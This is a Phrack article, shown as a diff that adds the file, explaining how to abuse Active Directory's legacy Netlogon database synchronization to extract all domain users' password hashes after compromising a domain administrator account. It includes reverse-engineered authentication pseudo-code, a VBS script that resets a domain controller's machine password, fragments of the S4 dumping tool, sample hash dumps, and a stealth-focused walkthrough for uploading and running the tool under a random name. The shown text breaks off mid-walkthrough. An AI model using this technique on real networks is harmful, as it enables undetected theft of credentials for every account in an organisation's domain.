@@ -1,0 +1,1231 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x11 of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=-----=[ Abusing Netlogon to steal an Active Directory's secrets ]=-----=|
+|=-----------------------------------------------------------------------=|
+|=-----------------------=[  by the p1ckp0ck3t  ]=-----------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ anonymous_7406da@phrack.org ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+                                  <<<->>>
+
+  + Prologue
+  + Common tools & appropriate warnings!
+  + Meet the Samba 4 project
+  + Digging into the Netlogon replication mechanism
+  + Extracting the secrets
+  + A practical introduction to S4 (Stealth & Secure Secret Stealer)
+  + S4 .VS. Windows 2008 Domain Controllers
+  + Additional details
+  + Last words
+  + Bibliography
+  + c0de: S4
+
+                                  <<<->>>
+
+
+---[ 1 - Prologue
+
+
+If you've been hacking around Windows networks then you must be more than
+familiar with common LSA dumping tools such as pwdump [01] & co. You must
+also know that they are not only detected by (most?) AV, but furthermore
+that they may not work the expected way when an AV/HIPS is installed on
+your target. In the worst case a box may even crash! It's fucking annoying.
+
+In a Windows network, crashing a workstation is probably harmless (natural
+Windows behavior you could say) because administrators won't notice and its
+user will only complain. He may also kick the box, blame "fucking M$" and
+ultimately reboot it. But in the end, we all know that he will rather focus
+on the recovery of his Office document than look for evidence (assuming he
+has the required skills to begin with). The situation is entirely different
+when it comes to Windows servers and especially DC (Domain Controllers).
+For these kinds of target, one needs to be *very* cautious because an
+administrator would find a crash *very* suspicious.
+
+This paper presents a (hopefully) new technique to retrieve the AD (Active
+Directory [02])'s secrets using one of its (natural) replication mechanisms
+when a DC or a domain administrator's account has been compromised. Because
+it's solely based on the Windows API -without any hooks or (too) dirty
+tricks- it's a quiet efficient way to retrieve domain users' hashed
+passwords.
+
+
+---[ 2 - Common tools & appropriate warnings!
+
+
+Let me first begin by a bit of bitching regarding what's already available
+out there. There are a lot of tools dealing with "online" password dumping,
+most being open source, a few of them being however commercial software (I
+haven't tested those). Judging from my experience (and that of many
+friends) I can tell you that only a few of them are *really* of interest. I
+won't fill a bug report -:]- but remember that a good password dumping tool
+should provide:
+
+1. Stability:    Using such a tool should *never* be risky for the target's
+                 safety. Interactions with LSASS are really intrusive and
+                 dangerous and should be avoided if possible. You wouldn't
+                 use a kernel sploit without having first understood how
+                 and why it's working right? Same thing here. Crashing
+                 LSASS means crashing the box!
+
+2. Stealthiness: You should never take the risk to be caught by some
+                 AV/HIPS. It's no news that there are Windows APIs that you
+                 can't use anymore and it's obvious that binaries provided
+                 by a famous security website have a good chance to be
+                 detected.
+
+Take for example the case of fgdump & gsecdump. Both are great tools with a
+very good chance to succeed. But, can you seriously trust software that:
+
+    - Hook well known LSASS functions (using even more known techniques)?
+      (pwdump6 of fgdump)
+    - Parse internal LSASS memory? (gsecdump)
+    - Write well known (=> detected) dll & exe files on disk? (fgdump)
+    - Start new services? Stop AV services? (fgdump)
+    - Are closed source? (gsecdump)
+
+Especially with poorly designed AV/HIPS running on the same machine? Don't
+take me wrong, I'm not dissing pwdump* (or the similar) tools especially
+since they are necessary; but at least patch them a bit, you moron! In the
+case of a workstation target, there are no other public alternatives. But
+there's another story in the case of a DC target. What can be done in this
+matter?
+
+Let me tell you the story that months later would lead me to this paper.
+Because it's a story, some details are missing, especially in the reverse
+engineering work performed. The idea is to keep the paper simple, as well
+as to give you the opportunity to find the last pieces of the puzzle all by
+yourself; follow the hints, hacker :]
+
+
+---[ 3 - Meet the spart^wSamba 4 project
+
+
+Unix people are well aware of the Samba project but only a few of them are
+truly aware of how incredible this project really is. This is not just
+about mounting CIFS volumes, but a complete reverse engineering/rewrite of
+several parts of Windows. Kudos to the Samba team.
+
+A few years ago, the Samba team decided to start a new branch of their
+project: Samba 4 [03]. The goal was to provide an even deeper integration
+of a Samba server inside an Active Directory. Now with Samba 4, a Unix
+computer can become a (RO)DC and what's even more incredible is that it's
+as easy (well if you're lucky) as typing:
+
+------------------------------[ screendump ]-------------------------------
+# samba-tool join FOO.BAR DC -Uadministrator@foo.bar --realm=FOO.BAR
+---------------------------------------------------------------------------
+
+This command (dc)promotes our Linux box in the AD (in this case the domain
+is foo.bar). It's easy to check that it's indeed properly registered as a
+legitimate DC using for example an LDAP query:
+
+------------------------------[ screendump ]-------------------------------
+$ ldapsearch -x -LLL -h dc1.foo.bar -D "administrator@foo.bar" -W -b
+"OU=Domain Controllers,dc=foo,dc=bar" "(objectClass=Computer)" cn
+Enter LDAP Password: *******
+dn: CN=DC1,OU=Domain Controllers,DC=foo,DC=bar
+cn: DC1               <-- first DC
+
+dn: CN=MEDIA,OU=Domain Controllers,DC=foo,DC=bar
+cn: MEDIA             <-- second DC = our proud little Linux
+---------------------------------------------------------------------------
+
+As all traditional DC functions are properly running, Kerberos services are
+running as well to authenticate domain users whenever it is required:
+
+------------------------------[ screendump ]-------------------------------
+# samba-tool samdump
+[...]
+Administrator:500:BAC14D04669EE1D1AAD3B435B51404EE:\
+                  FBBF55D0EF0E34D39593F55C5F2CA5F2:[UX]:LCT-4F1B2611
+Guest:501:NO PASSWORDXXXXXXXXXXXXXXXXXXXXX:\
+          NO PASSWORDXXXXXXXXXXXXXXXXXXXXX:[NDUX]:LCT-00000000
+krbtgt:502:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+           D25E142705B3C1B9122309D194E0B36F:[DU]:LCT-4F1B1EFC
+SUPPORT_388945a0:1001:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+                      4CB5D040611B3FF00F17AF7DC344F97C:[DUX]:LCT-4F1B196F
+DC1$:1003:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+          A59B7CDD1167816DFDD8C5F310ACCEC0:[S]:LCT-4F1B1F2F
+tofu:1117:E91851A7E394D006ABD3B435B31404EE:\
+          15221599C25FA333EA6044C0513ADD45:[UX]:LCT-4F1B23FB
+HAXOR$:1120:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+            88369D133A118783D46D1C6344E99B08:[W]:LCT-4F1B366B
+cheese:1121:BC5F4D08D49A0099AAD3B43CB51404EE:\
+            3E21E05DD9E4E790CB3783D9292F80F7:[UX]:LCT-4F1BE1F2
+MEDIA$:1122:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:\
+            72CCE806701E837DCBB33B29A9D48E97:[S]:LCT-4F1C3AB1
+[...]
+---------------------------------------------------------------------------
+
+When I discovered how mature the Samba 4 project had become and what it
+allowed me to perform, I started to imagine how I could take advantage of
+the situation. The first idea I came up with was to introduce a temporary
+Samba 4 DC in the AD infrastructure, dump the passwords and immediately
+dcpromote it again (=remove it from the AD). However this idea is really
+bad regarding the criteria that I gave earlier:
+
+    - Stability: No matter how functional Samba 4 may appear, it's many
+      years too soon to use it for serious purpose. To give you an example,
+      I destroyed many testing environments as I was playing with Samba 4
+      (merely using it in fact).
+
+    - Stealthiness: I doubt there is even one person able to tell us how
+      many modifications the introduction of a new DC would bring in the
+      AD. Do you honestly think that you could introduce a DC, make it
+      disappear and that no administrator would ever be able to tell that
+      it was there? I'm not taking the risk and neither should you.
+
+For these two reasons, it was wise to resign (interestingly, as I would be
+told later, some French guy apparently didn't [04]).
+
+At this point, I had no more ideas until I realized that network traffic
+was exchanged between DC1 (another DC from the domain) and MEDIA when I was
+typing the samdump command. More precisely, and thanks to Wireshark's
+dissectors (courtesy of the Samba team), I was able to observe the
+following events:
+
+    1. NTLM Authentication Protocol used to authenticate MEDIA
+    2. MEDIA binding on \\DC3.FOO.BAR\IPC$\lsarpc and calling
+           -> lsa_OpenPolicy2()       (opnum 44)
+           -> lsa_QueryInfoPolicy2    (opnum 46)
+    3. MEDIA binding on \\DC3.FOO.BAR\IPC$\netlogon and calling
+           -> NetrServerReqChallenge  (opnum 4)
+           -> NetrServerAuthenticate2 (opnum 15)
+    4. MEDIA binding again (*) on \\DC3.FOO.BAR\IPC$\netlogon and calling
+           -> NetrDatabaseSync        (opnum 8)
+           -> NetrDatabaseSync        (opnum 8)
+           -> NetrDatabaseSync        (opnum 8)
+
+(* Using 2 different binds in step 3 & 4 seems weird at first but it will
+be explained later.)
+
+I was immediately interested in the NetrDatabaseSync() function and googled
+a bit to see if I could find some documentation. Fortunately, Microsoft
+documents this function; it is a wrapper of NetrDatabaseSync2() [05].
+
+-----------------------[ MS official documentation ]-----------------------
+NTSTATUS NetrDatabaseSync2(
+  [in, string] LOGONSRV_HANDLE PrimaryName,
+  [in, string] wchar_t* ComputerName,
+  [in] PNETLOGON_AUTHENTICATOR Authenticator,
+  [in, out] PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
+  [in] DWORD DatabaseID,
+  [in] SYNC_STATE RestartState,
+  [in, out] unsigned long* SyncContext,
+  [out] PNETLOGON_DELTA_ENUM_ARRAY* DeltaArray,
+  [in] DWORD PreferredMaximumLength
+);
+[...]
+The NetrDatabaseSync2 method returns a set of all changes applied to the
+specified database since its creation. It provides an interface for a BDC
+to fully synchronize its databases to those of the PDC.
+[...]
+---------------------------------------------------------------------------
+
+So, it seemed safe to assume that the network traffic observed was the
+consequence of a synchronization mechanism. If you're familiar with Windows
+networks then there is something that should immediately draw your
+attention: the documentation is mentioning PDC (Primary Domain Controller)
+& BDC (Backup Domain Controller) which are pre-Windows2000 (= NT4)
+concepts. Indeed, Windows 2000 introduced Active Directory which uses a
+different logic. Wikipedia [06] explains it perfectly:
+
+-----------------[ Wikipedia: Primary Domain Controller ]------------------
+In later releases of Windows, domains have been supplemented by the use of
+Active Directory services. In Active Directory domains, the concept of
+primary and secondary domain controller relationships no longer applies.
+Primary domain controller emulators hold the accounts databases and
+administrative tools. [...] The same rules apply; only one PDC may exist on
+a domain, but multiple replication servers may still be used.
+---------------------------------------------------------------------------
+
+Note: "later releases" means Windows 2000 or above.
+
+So I came up with the conclusion that Samba 4 was (and still is) using an
+old -now emulated- mechanism to synchronize the AD database between its
+DCs. More precisely in Active Directory, a unique DC holds the PDC FSMO
+role [12], the other DCs being (emulated) BDC as a result. Now pay
+attention to the "DatabaseID" parameter passed to NetrDatabaseSync2():
+
+-----------------------[ MS official documentation ]-----------------------
+DatabaseID: The identifier for a specific database for which the changes
+are requested. It MUST be one of the following values.
+
+    Value                       Meaning
+    -----                       -------
+
+    0x00000000                  Indicates the SAM database.
+    0x00000001                  Indicates the SAM built-in database.
+    0x00000002                  Indicates the LSA database.
+---------------------------------------------------------------------------
+
+Assuming an attacker could call NetrDatabaseSync2() with DatabaseID=0 from
+an (emulated) BDC (= a compromised DC), then he would likely be able to
+retrieve the user database (SAM), which should include hashed passwords as
+well, right?
+
+I was very suspicious at first because the documentation wasn't mentioning
+anything about the LSA queries and lsa_QueryInfoPolicy2() is still
+currently undocumented (afaik). I was afraid that this would complicate
+things. I could have started to dig inside Samba 4's code (which is quite
+messy unfortunately) but I had instead a much better idea. What if this API
+was implemented in some native program available with Windows Server?
+
+Guess the answer.
+
+
+---[ 4 - Digging into the Netlogon replication mechanism
+
+
+If you're familiar with Windows sysadmin stuff then you must be well aware
+of the "Remote Server Administration Tools" [07] which provides a set of
+useful new commands for the CLI, including the one I was looking for:
+nltest.exe (now native under Windows 2008 FYI).
+
+Here is how Microsoft describes the tool:
+
+-----------------------[ MS official documentation ]-----------------------
+You can use nltest to:
+
+    Get a list of domain controllers
+
+    Force a remote shutdown
+
+    Query the status of trust
+
+    Test trust relationships and the state of domain controller replication
+    in a Windows domain
+
+    Force a user-account database to synchronize on Windows NT version 4.0
+    or earlier domain controllers      <-- synchronize + NT4 == JACKPOT?
+---------------------------------------------------------------------------
+
+The last sentence is interesting, right?
+
+Looking at the IAT of nltest.exe (for Windows 2003), I saw that there were
+entries for I_NetServerReqChallenge(), I_NetServerAuthenticate() and
+I_NetDatabaseSync(), all of them being imported from NETAPI32.dll and
+(strangely) undocumented.
+
+A short look at them convinced me that they were mere wrappers for RPC
+calls to (respectively) NetrServerReqChallenge(), NetrServerAuthenticate()
+and NetrDatabaseSync() located in netlogon.dll and obviously called using a
+binding to the named pipe \\%COMPUTERNAME%\IPC$\netlogon. What's cool with
+these functions is that they _are_ documented in [08] and a tiny
+modification apart, their prototypes match those of their NETAPI32.dll
+cousins.
+
+To make things even easier, I observed that all our targeted functions were
+called inside one big function, arbitrarily called SyncFunction() from now
+on. Reversing SyncFunction() was a task which proved to be really easy
+thanks to Microsoft's API documentation.
+
+Assuming DC2 requests a synchronization from its PDC (DC1), this gives the
+approximate pseudo-code (I omitted details about the assembly for
+clarification purposes, but you can find them in the uuencoded C code at
+the end of the article):
+
+-----------------------------[ SyncFunction() ]----------------------------
+
+    # Step 1:
+    # ClientChallenge is an 8 bytes array randomly chosen
+
+    RANDOM(ClientChallenge);
+
+    # Step 2:
+    # DC2 sends its challenge and requests one (also an 8 bytes array)
+    # from DC1
+
+    ZERO(ServerChallenge);
+    I_NetReqChallengeFunc(
+        (WCHAR) L"\\\\" + DC1_FQDN,
+        (WCHAR) DC2_HOSTNAME,
+        ClientChallenge,
+        [OUT] ServerChallenge);
+
+    # Step 3:
+    # The client creates a Unicode object out of its machine account name
+    # (suffix is '$') and hashes it using SystemFunction007() which is an
+    # MD4()
+    # The resulting hash (NTLM) is an 8 bytes array: MD4_HASH
+
+    UnicodeString(ComputerName, "DC2$")
+    ZERO(MD4_HASH);
+    SystemFunction007((UnicodeString)ComputerName, MD4_HASH);
+
+    # Step 4:
+    # To authenticate itself, the client will need to compute a new
+    # challenge (NewClientChallenge).
+    # To do so, the client builds a DES key (SessionKey) using the two
+    # challenges and the previously computed hash.
+
+    ZERO(SessionKey, 16);
+    NlMakeSessionKey(
+        MD4_HASH,
+        ClientChallenge,
+        ServerChallenge,
+        [OUT] SessionKey);
+
+    # Step 5:
+    # The client computes NewClientChallenge using SessionKey.
+
+    Encrypt000(
+        ClientChallenge,
+        [OUT] NewClientChallenge,
+        SessionKey);
+
+    # Step 6:
+    # The client sends NewClientChallenge to authenticate itself.
+    # If the answer is the correct one, the server will acknowledge
+    # the identity of the client and gives him back his own challenge
+    # (NewServerChallenge)
+
+    ZERO(NewServerChallenge);
+    I_NetServerAuthenticate(
+        (WCHAR) L"\\\\" + DC1_FQDN,
+        L"DC2$",                # DC2's machine account name
+        ServerSecureChannel = 6,
+        (WCHAR) L"DC2",         # DC2's hostname
+        NewClientChallenge,
+        [OUT] NewServerChallenge,
+        NegotiateFlags);
+
+    # Step 7:
+    # The client needs to know that he can trust the server so the
+    # authentication has to be _mutual_. Imagine if a rogue DC was sending
+    # a false SAM, this would allow an attacker to authenticate himself on
+    # DC2 using spoofed credentials.
+    #
+    # To check the identity of the server, NewServerChallenge must have
+    # been calculated using ServerChallenge and SessionKey which is common
+    # to DC1 and DC2.
+
+    Encrypt000(
+        ServerChallenge,
+        [OUT] ExpectedKey,
+        SessionKey);
+
+    if( NewServerChallenge != ExpectedKey )
+    {
+        exit(1);
+    }
+
+    # Step 8:
+    # For each type of database (DatabaseID), DC2 computes a new challenge
+    # which is stored in Authenticator and retrieves the database object
+    # DeltaArray. After each call, the client checks the authenticity of
+    # the data returned.
+
+    for(DatabaseID=0; DatabaseID<3; DatabaseID++)
+    {
+        NlBuildAuthenticator(
+            NewClientChallenge,
+            SessionKey,
+            [OUT] Authenticator);
+
+        ZERO(ReturnAuthenticator);
+        I_NetDatabaseSync(
+            (WCHAR) L"\\\\" + DC1_FQDN,
+            (WCHAR) DC2_HOSTNAME,
+            Authenticator,
+            ReturnAuthenticator,
+            DatabaseID,
+            SyncContext=0,
+            [OUT] DeltaArray,
+            -1);
+
+        if( NlUpdateSeed(
+                NewClientChallenge,
+                ReturnAuthenticator,
+                SessionKey) == 0 )
+        {
+            exit(1);
+        }
+    }
+---------------------------------------------------------------------------
+
+With the additional functions:
+
+-----------------------------[ subfunctions ]------------------------------
+
+# This function uses the 14 first bytes of SessionKey to compute
+# a new challenge out of an old one. Both challenges are 8 bytes
+# arrays.
+#
+# new = DES(DES(old))
+
+
+Encrypt000(
+    ClientChallenge,
+    NewChallenge,
+    SessionKey)
+{
+    BYTE TempOutput[8];
+
+    ZERO(NewChallenge);
+    SystemFunction001(ClientChallenge, SessionKey[0..6], TempOutput);
+    SystemFunction001(TempOutput, SessionKey[7..13], NewChallenge);
+
+    # TempOutput = DES(in=ClientChallenge, k=SessionKey[0..6])
+    # NewChallenge = DES(in=TempOutput, k=SessionKey[7..13])
+}
+
+                                    ---
+
+# The SessionKey is calculated using a combination of ClientChallenge
+# and ServerChallenge (to avoid replay attacks I believe).
+# Because client & server both know the MD4 value (a shared key between
+# them), they both can compute safely the SessionKey, but an attacker
+# without this knowledge will be unable to.
+
+NlMakeSessionKey(
+    MD4,
+    ClientChallenge,
+    ServerChallenge,
+    SessionKey)
+{
+    BYTE TempOut[8];
+
+    ZERO(SessionKey)
+    SessionKey[0..3] = ClientChallenge[0..3] + ServerChallenge[0..3];
+    SessionKey[4..7] = ClientChallenge[4..7] + ServerChallenge[4..7];
+
+    SystemFunction001(SessionKey[0..7], MD4[0..6], TempOut);
+    SystemFunction001(TempOut, MD4[9..15], SessionKey);
+
+    # TempOut = DES(SessionKey[0..7], MD4[0..6])
+    # SessionKey = DES(TempOut, MD4[9..15])
+}
+
+                                    ---
+
+# This function builds the Authenticator necessary for each
+# *DatabaseSync() call. The authenticator includes a Timestamp which is
+# used in the computation of the new Challenge.
+
+NlBuildAuthenticator(
+    NewClientChallenge,
+    SessionKey,
+    Authenticator
+    )
+{
+    FILETIME Time;
+    ZERO(Authenticator);
+    GetSystemTimeAsFileTime(Time);
+    RtlTimeToSecondsSince1970(
+        Time,
+        Authenticator->Timestamp);
+    NewClientChallenge[0..3] += Authenticator->Timestamp;
+    Encrypt000(
+        NewClientChallenge,
+        Authenticator->Credential,
+        SessionKey);
+}
+
+                                    ---
+
+# The server is supposed to acknowledge securely the request.
+# This function checks that the acknowledgment is indeed from
+# the server and not from some rogue DC.
+
+NlUpdateSeed(
+    NewClientChallenge,
+    ReturnAuthenticator,
+    SessionKey
+    )
+{
+    BYTE TempOut[8];
+
+    NewClientChallenge[0]++;
+    Encrypt000(
+        NewClientChallenge,
+        TempOut,
+        SessionKey);
+
+    if( ReturnAuthenticator->Credential == TempOut )
+        return 1;
+
+    return 0;
+}
+---------------------------------------------------------------------------
+
+Let's put aside the usual Microsoft crypto weirdness of the protocol
+because this is not the subject of this article. In a nutshell:
+
+    - The client (BDC) and the server (PDC) both compute a session key
+      using random challenges (to avoid replay attacks) and a 'secret' MD4
+      key.
+    - Once a trusted bond between them is established, the server sends
+      several objects (of type DeltaArray) which should contain the
+      expected secrets. The trusted bond is called a 'secure channel' in
+      Microsoft's documentation.
+    - To avoid man-in-middle attempts, the exchanges are somehow
+      authenticated using the session key (which has another purpose, but
+      that's another story my friends).
+
+Now, if you have been attentive you may have realized that I never
+mentioned any LSA related functions (remember lsarpc bind?) and that the
+session key would be really easy to deduce for a passive observer (sniffer)
+because the shared secret (%BDC_NAME% + "$") is predictable. And indeed, it
+didn't work when I first tested the code built upon the reverse engineering
+process. I_NetServerAuthenticate() kicked me out with the classical "Access
+Denied" message.
+
+So what went wrong? I was almost sure that the lsa_() functions were not
+necessary because they are not used in nltest.exe. So this led me to think
+that somehow NewClientChallenge wasn't correct. Assuming the algorithm was
+well reversed, the session key produced by NlMakeSessionKey() had to be
+erroneous. Strange? Not quite. Remember that the MD4 key is somehow weird.
+Even considering Microsoft's past, it was hard to believe that they would
+base the security of their protocol on such a value. And indeed they aren't
+that crazy! Using the appropriate hook in LSASS, I found out that this MD4
+was in fact the client's computer account hash (NTLM)! A result that I
+would later find almost everywhere whenever looking for some information on
+the so-called 'secure channel'. Sometimes you just have to keep looking...
+
+The problem is that retrieving the BDC's computer account NTLM is
+(probably) as hard as retrieving the whole SAM itself. So how do we deal
+with the Ouroboros? The solution is actually quite simple: we may not know
+the NTLM hash, but we can easily change it! Look at this nice piece of 
+code:
+
+-------------------------------[ passwd.vbs ]------------------------------
+Dim objComputer
+
+Set objComputer = GetObject("WinNT://foo.bar/DC2$")
+objComputer.SetPassword "dummy"
+
+Wscript.Quit
+---------------------------------------------------------------------------
+
+Executing the VBS script on the 'BDC' is enough (remember that we own a
+domain administrator account). The cool thing with this trick is that the
+BDC will then synchronize its password with the 'PDC' for us. Cool trick
+right? And this proved to be enough to have I_NetDatabaseSync()
+successfully returning. In the tool that I wrote, I implemented it using
+the IADsUser::SetPassword() method.
+
+                             >>>>>>>>>>>>>>>>>>
+I was lucky with the nltest.exe analysis because I didn't use the Windows
+2008 version. On Windows 2008 server, I_NetDatabaseSync() isn't used so it
+would have forced me to reverse engineer Samba's C code which is far more
+difficult believe me :-P
+                             <<<<<<<<<<<<<<<<<<
+
+
+---[ 5 - Extracting the secrets
+
+
+Now that this part of the job is finished, we only need to know how to
+parse the DeltaArray objects, something partially documented by Microsoft
+[09]. nltext.exe doesn't perform this task (it only tests that the
+synchronization is working and frees the DeltaArray objects that it
+receives) but obviously samba-tool does.
+
+
+-----[ 5.1 - Browsing samba-tool's source code
+
+
+Everything starts in source4/samba_tool/samba_tool.c:
+
+    1. main() calls binary_net(), the main function
+    2. binary_net() then:
+
+         - Initializes the Python interpreter using Py_Initialize()
+
+         - Creates a dictionary out of the "samba.netcmd" module using
+           py_commands() which returns the Python object "commands". This
+           object is created in:
+           source4/scripting/python/samba/netcmd/__init__.py:
+
+           -------------------------------------------------------
+           commands = {}
+           from samba.netcmd.pwsettings import cmd_pwsettings
+           commands["pwsettings"] = cmd_pwsettings()
+           from samba.netcmd.domainlevel import cmd_domainlevel
+           commands["domainlevel"] = cmd_domainlevel()
+           from samba.netcmd.setpassword import cmd_setpassword
+           commands["setpassword"] = cmd_setpassword()
+           from samba.netcmd.newuser import cmd_newuser
+           commands["newuser"] = cmd_newuser()
+           from samba.netcmd.netacl import cmd_acl
+           [...]
+           -------------------------------------------------------
+
+    3. There are 3 possible situations:
+
+         - If argv[1] is handled by a Python module then commands[argv[1]]
+           is not void and the corresponding method is called.
+
+         - Else if argv[1] is in net_functable[] then a C function is
+           handling the command.
+
+         - Else argv[1] is not a legitimate command => error msg!
+
+In the case of 'samdump', it is implemented in the C language by the
+net_samdump() function available in source4/samba_tool/vampire.c. This
+function calls libnet_SamSync_netlogon() (source4/libnet/libnet_samsync.c)
+which:
+
+    - Establishes the secure channel
+    - Calls dcerpc_netr_DatabaseSync_r() 3 times (1 per DatabaseID value)
+    - Calls samsync_fix_delta() in (libcli/samsync/decrypt.c) which handles
+      the decryption (if required). Remember this function.
+
+
+-----[ 5.2 - Understanding database changes
+
+
+I_NetDatabaseSync() returns DeltaArray which is a NETLOGON_DELTA_ENUM_ARRAY
+object. It's very well documented by Microsoft:
+
+-----------------------[ MS official documentation ]-----------------------
+// http://msdn.microsoft.com/en-us/library/cc237083%28v=prot.13%29.aspx
+typedef struct _NETLOGON_DELTA_ENUM_ARRAY {
+  DWORD CountReturned;
+  [size_is(CountReturned)] PNETLOGON_DELTA_ENUM Deltas;
+} NETLOGON_DELTA_ENUM_ARRAY,
+ *PNETLOGON_DELTA_ENUM_ARRAY;
+
+// http://msdn.microsoft.com/en-us/library/cc237082%28v=prot.13%29.aspx
+typedef struct _NETLOGON_DELTA_ENUM {
+  NETLOGON_DELTA_TYPE DeltaType;
+  [switch_is(DeltaType)] NETLOGON_DELTA_ID_UNION DeltaID;
+  [switch_is(DeltaType)] NETLOGON_DELTA_UNION DeltaUnion;
+} NETLOGON_DELTA_ENUM,
+ *PNETLOGON_DELTA_ENUM;
+---------------------------------------------------------------------------
+
+So basically DeltaArray is an array of NETLOGON_DELTA_ENUM objects.
+Depending on their DeltaType field, the receiver will know how to parse
+their internal fields (DeltaID and DeltaUnion). According to Microsoft,
+DeltaType may take the following values:
+
+-----------------------[ MS official documentation ]-----------------------
+// http://msdn.microsoft.com/en-us/library/cc237100%28v=prot.13%29.aspx
+The NETLOGON_DELTA_TYPE enumeration defines an enumerated set of possible
+database changes.
+
+typedef  enum _NETLOGON_DELTA_TYPE
+{
+  AddOrChangeDomain = 1,
+  AddOrChangeGroup = 2,
+  DeleteGroup = 3,
+  RenameGroup = 4,
+  AddOrChangeUser = 5,
+  DeleteUser = 6,
+  RenameUser = 7,
+  ChangeGroupMembership = 8,
+  AddOrChangeAlias = 9,
+  DeleteAlias = 10,
+  RenameAlias = 11,
+  ChangeAliasMembership = 12,
+  AddOrChangeLsaPolicy = 13,
+  AddOrChangeLsaTDomain = 14,
+  DeleteLsaTDomain = 15,
+  AddOrChangeLsaAccount = 16,
+  DeleteLsaAccount = 17,
+  AddOrChangeLsaSecret = 18,
+  DeleteLsaSecret = 20,
+  DeleteGroupByName = 20,
+  DeleteUserByName = 21,
+  SerialNumberSkip = 22
+} NETLOGON_DELTA_TYPE;
+---------------------------------------------------------------------------
+
+When dcerpc_netr_DatabaseSync_r() returns, samsync_fix_delta() is called
+for each NETLOGON_DELTA_ENUM object. The source code of this function is
+straightforward (libcli/samsync/decrypt.c):
+
+--------------------------[ Samba 4 source code ]--------------------------
+NTSTATUS samsync_fix_delta(TALLOC_CTX *mem_ctx,
+                           struct netlogon_creds_CredentialState *creds,
+                           enum netr_SamDatabaseID database_id,
+                           struct netr_DELTA_ENUM *delta)
+{
+        NTSTATUS status = NT_STATUS_OK;
+
+        switch (delta->delta_type) {
+                case NETR_DELTA_USER:
+
+                        status = fix_user(mem_ctx,
+                                          creds,
+                                          database_id,
+                                          delta);
+                        break;
+                case NETR_DELTA_SECRET:
+
+                        status = fix_secret(mem_ctx,
+                                            creds,
+                                            database_id,
+                                            delta);
+                        break;
+                default:
+                        break;
+        }
+
+        return status;
+}
+---------------------------------------------------------------------------
+
+So to summarize, amongst all the NETLOGON_DELTA_ENUM that
+I_NetDatabaseSync() provides us, the only important ones are those of type
+AddOrChangeUser (NETR_DELTA_USER) and AddOrChangeLsaSecret
+(NETR_DELTA_SECRET).
+
+
+-----[ 5.3 - Retrieving the hashes
+
+
+Because the subject of this paper is pwdump-like tools, we will only focus
+our attention on the AddOrChangeUser type. Here is the code that I used to
+extract the useful objects:
+
+----------------------------[ S4 source code ]-----------------------------
+	PNETLOGON_DELTA_ENUM Deltas = DeltaArray->Deltas;
+	for(i=0; i<DeltaArray->CountReturned; i++)
+	{
+
+#ifdef __debug__
+		if(Deltas->DeltaType == AddOrChangeLsaSecret)
+		{
+            [...]
+		}
+#endif
+
+		if(Deltas->DeltaType == AddOrChangeUser)
+        {
+			PNETLOGON_DELTA_USER DUser;
+			DUser = (PNETLOGON_DELTA_USER)
+				Deltas->DeltaUnion.DeltaUser;
+
+			arcfour_crypt_blob(
+				DUser->PrivateData.Data,
+				DUser->PrivateData.DataLength,
+				SessionKey,
+				16);
+			[...]
+		}
+[...]
+---------------------------------------------------------------------------
+
+The NETLOGON_DELTA_USER object holds information about a particular User
+of the domain including its Username and (hashed) password. However
+depending on the value of NtPasswordPresent and LmPasswordPresent, the
+password may not be available in the EncryptedNtOwfPassword and
+EncryptedLmOwfPassword fields of the structure. In this case, they are
+stored instead in the PrivateData.Data buffer which is RC4 encrypted
+using the SessionKey. Practically speaking, this last case is the only one
+I've ever witnessed.
+
+The PrivateData.Data buffer holds a copy of the information returned by
+SamIGetPrivateData() which is a function called by pwdump6. The current
+(and potentially former) hashed passwords are stored somehow in this buffer
+and ripping the appropriate functions in the pwdump6 tool grants us the
+Holy Grail. There is no need to explain what is already common knowledge in
+the windows hacking world.  Have a look at the DealWithDeltaArray()
+function in my code if you have any questions.
+
+
+---[ 6 - A practical introduction to S4 (Stealth & Secure Secret Stealer)
+
+
+All this work ultimately resulted in a single tool: S4 (courtesy of the
+grateful p1ckp0ck3t to the Samba team ;]). I've chosen to release it under
+the GPL because I certainly disliked the idea of the pigs from MSF
+including it in their framework. That said, "let the hacking begin".
+
+                                  Context
+                                  +++++++
+
+We have a CMD shell on some XP/Seven box part of the 'foo.bar' 2003 domain.
+Somehow we also got our hands on the credentials of a domain administrator:
+"Administrator / foo123"
+
+Our goal is simple; we now want to extract the passwords from the AD.
+
+                              Locating the PDC
+                              ++++++++++++++++
+
+Retrieving the location of the DC is as easy as performing a DNS request on
+the domain name (foo.bar). However the problems with this approach are
+that:
+    - it gives DNS servers as well,
+    - it doesn't allow us to locate the PDC amongst the DCs.
+
+Fortunately, the dsquery tool is providing the information:
+
+------------------------------[ screendump ]-------------------------------
+C:\Users\Administrator>dsquery server -hasfsmo PDC
+"CN=DC3,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=
+foo,DC=bar"
+
+C:\Users\Administrator>
+---------------------------------------------------------------------------
+
+Now if for some reason this command isn't available, you can use the -D
+option of S4 which is based on DsGetDomainControllerInfo().
+
+------------------------------[ screendump ]-------------------------------
+C:\Users\Administrator>S4.exe -D -d foo.bar
+[> Discovery mode
+        - DC controller 0 is DC3.foo.bar [PDC]
+        - DC controller 1 is DC4.foo.bar
+
+C:\Users\Administrator>
+---------------------------------------------------------------------------
+
+At this point, we know that DC3 is the PDC and DC4 (the only remaining DC)
+is de facto a BDC. S4.exe will thus be executed from DC4, targeting DC3.
+
+                               Uploading S4
+                               ++++++++++++
+
+To run S4 on DC4, you first have to upload it. \\%DCNAME%\SYSVOL is
+convenient for this purpose. To drop a file in this directory, you will use
+the Domain Administrator account:
+
+------------------------------[ screendump ]-------------------------------
+c:\S4>hostname
+WINXP
+C:\S4>net use P: \\DC4\SYSVOL
+Enter the user name for 'DC4': administrator
+Enter the password for DC4:
+The command completed successfully.
+
+C:\S4>copy S4.exe P:\randomname.exe
+        1 file(s) copied.
+
+C:\S4>net use P: /DELETE
